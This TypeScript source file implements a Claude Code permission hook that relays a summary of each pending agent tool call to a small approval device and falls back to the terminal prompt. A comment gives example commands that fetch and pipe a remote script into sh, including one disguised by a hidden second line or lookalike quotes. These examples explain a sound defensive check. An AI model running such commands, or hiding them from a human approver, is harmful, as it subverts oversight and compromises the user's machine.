/**
 * `harness device claude approve`: the client Claude Code's PermissionRequest hook runs (plugins/harness-device). It asks
 * the dial about the one waiting tool call and prints its answer. It decides nothing by itself: anything it cannot read
 * or hear back prints nothing, and the terminal's own prompt decides.
 *
 * What leaves this process is four fields and a flag. The tool input is cut to a one-line summary here, so the rest of
 * it (a file's content, a whole script) never reaches the daemon. No environment variable is sent: Orca puts
 * ORCA_PAIRING_CODE and ORCA_AGENT_SESSION_SPAWN_TOKEN in the same environment. This file runs only in the `harness`
 * command's own process, and spells the three decisions itself rather than importing the core's.
 */
import { daemonFetch, localSocketRoute } from '../lib/localTransport.js'

type Decision = 'allow' | 'deny' | 'none'

export interface ApprovalBody {
  sessionId: string
  tool: string
  summary: string
  cwd?: string
  /** The dial cannot show the command whole: it shows the agent waiting, and the terminal's prompt decides. */
  terminalOnly?: true
}

export interface ApproveDeps {
  stdin: AsyncIterable<Buffer | string>
  post(body: ApprovalBody): Promise<Decision>
  out(text: string): void
}

const MAX_STDIN_BYTES = 256 * 1024
/** The core's bounds (core/deviceHookCalls.ts): a longer tool name would be refused, and the card lost with it. */
const MAX_TOOL_CHARS = 64
/** Bytes, as the round dial holds its question in a 256-byte buffer, and "Allow <tool>?\n" must fit beside it. */
const MAX_SUMMARY_BYTES = 200
/** Past the devices' 300 s and the core's 305 s, so an expiry is counted there; inside the hook's 330 s, so this answers before Claude Code kills it. */
const WAIT_MS = 310_000
/** These need the person at the terminal anyway: an answer from the dial would only stand in their way. */
const PERSON_ONLY = new Set(['AskUserQuestion', 'ExitPlanMode'])
const FILE_TOOLS = new Set(['Edit', 'Write', 'Read'])

const OUTPUT: Record<Decision, string> = {
  allow: JSON.stringify({ hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'allow' } } }),
  deny: JSON.stringify({ hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'deny', message: 'Denied from the Harness device.' } } }),
  none: '',
}

const isRecord = (value: unknown): value is Record<string, unknown> =>
  !!value && typeof value === 'object' && !Array.isArray(value)

function hostOf(url: string): string {
  try {
    return new URL(url).host
  } catch {
    return ''
  }
}

/** At most [max] bytes of UTF-8, cut between characters, never inside one. */
function cutBytes(text: string, max: number): string {
  if (Buffer.byteLength(text) <= max) return text
  let cut = '', bytes = 0
  for (const char of text) {
    bytes += Buffer.byteLength(char)
    if (bytes > max) break
    cut += char
  }
  return cut
}

/**
 * A command the dial cannot show whole, so Allow there would approve what the person never read: more than one line
 * (`npm test\ncurl evil.sh | sh` reads "npm test"), a line longer than the card holds, or a character outside printable
 * ASCII, which the dial draws as quoting or spacing that bash takes as a letter (`echo “; curl x | sh; ”` runs curl).
 */
function terminalOnly(input: unknown): boolean {
  const command = isRecord(input) && typeof input.command === 'string' ? input.command : ''
  const lines = command.split(/[\r\n]/).map((line) => line.trim()).filter(Boolean)
  return lines.length > 1 || Buffer.byteLength(lines[0] ?? '') > MAX_SUMMARY_BYTES || /[^\x20-\x7e\r\n]/.test(command)
}

/** The card's one line under "Allow <tool>?": what the tool acts on, or its name when the input does not say. */
export function approvalSummary(tool: string, input: unknown): string {
  const field = (name: string): string => {
    const value = isRecord(input) ? input[name] : undefined
    return typeof value === 'string' ? value : ''
  }
  const mcp = /^mcp__(.+?)__(.+)$/.exec(tool)
  // A command's first line with text: one that opens with a blank line would otherwise show the tool's name, not the command.
  const shown = tool === 'Bash' ? field('command').trim().split(/[\r\n]/)[0]
    : FILE_TOOLS.has(tool) ? field('file_path')
      : tool === 'NotebookEdit' ? field('notebook_path')
        : tool === 'WebFetch' ? hostOf(field('url'))
          : mcp ? `${mcp[1]}: ${mcp[2]}`
            : ''
  // The core refuses a control character in any field (core/deviceHookCalls.ts), which would lose the card.
  return cutBytes((shown.trim() || tool).replace(/\p{Cc}/gu, ' '), MAX_SUMMARY_BYTES)
}

/** The hook's input as the body to post, or null for no decision: too long, not JSON, or a tool the dial never answers. */
async function approvalBody(stdin: AsyncIterable<Buffer | string>): Promise<ApprovalBody | null> {
  const parts: Buffer[] = []
  let bytes = 0
  for await (const chunk of stdin) {
    const part = typeof chunk === 'string' ? Buffer.from(chunk) : chunk
    bytes += part.length
    if (bytes > MAX_STDIN_BYTES) return null
    parts.push(part)
  }
  let input: unknown
  try {
    input = JSON.parse(Buffer.concat(parts).toString('utf8'))
  } catch {
    return null
  }
  if (!isRecord(input)) return null
  const { session_id: sessionId, tool_name: tool, tool_input: toolInput, cwd } = input
  if (typeof sessionId !== 'string' || !sessionId || typeof tool !== 'string' || !tool || PERSON_ONLY.has(tool)) return null
  return {
    sessionId, tool: tool.slice(0, MAX_TOOL_CHARS), summary: approvalSummary(tool, toolInput),
    ...(typeof cwd === 'string' ? { cwd } : {}),
    ...(tool === 'Bash' && terminalOnly(toolInput) ? { terminalOnly: true as const } : {}),
  }
}

/** Asks once, prints the answer, and exits 0 whatever happens: a failure here must never block or decide the tool call. */
export async function runApprove(deps: ApproveDeps): Promise<0> {
  try {
    const body = await approvalBody(deps.stdin)
    if (!body) return 0
    const decision = await deps.post(body)
    // Posted so the dial shows the agent waiting; whatever comes back, the dial never showed the whole command.
    const output = body.terminalOnly ? '' : OUTPUT[decision]
    if (output) deps.out(output)
  } catch {
    // No decision: the terminal's prompt is still there.
  }
  return 0
}

/**
 * The post to the daemon's `/api/hook/approval`, over its socket as every CLI command reaches it (lib/localTransport.ts).
 * Anything but a 200 with a decision, an error or a wait past [WAIT_MS] is `none`.
 */
export function daemonPost(dataDir: string, port: number): (body: ApprovalBody) => Promise<Decision> {
  return async (body) => {
    // Only over the socket does the filesystem say the answer is the daemon's. Over the port, an account holding it
    // while the daemon restarts could answer allow (audit H1), so a folder too long for a socket sends nothing, and the
    // daemon logs why (hookServer.ts).
    if (!localSocketRoute(dataDir, port)) return 'none'
    const stop = new AbortController()
    const timer = setTimeout(() => stop.abort(), WAIT_MS)
    try {
      const response = await daemonFetch(dataDir, port)(`http://127.0.0.1:${port}/api/hook/approval`, {
        method: 'POST', signal: stop.signal,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      })
      const decision = (await response.json() as { decision?: unknown } | null)?.decision
      return response.status === 200 && (decision === 'allow' || decision === 'deny') ? decision : 'none'
    } catch {
      return 'none'
    } finally {
      clearTimeout(timer)
    }
  }
}
